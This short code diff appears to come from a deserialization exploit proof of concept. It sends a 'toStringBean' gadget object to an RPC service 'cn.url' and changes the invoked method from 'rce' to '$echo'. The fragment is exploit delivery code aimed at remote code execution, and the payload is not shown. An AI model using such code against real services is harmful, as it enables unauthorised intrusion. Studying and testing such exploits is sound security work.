@@ -25,5 +25,5 @@ toStringBean=new_object(
 
 resp = client.send_request_and_return_response(
     service_name='cn.url',
-    method_name='rce',
+    method_name='$echo',
     args=[toStringBean])
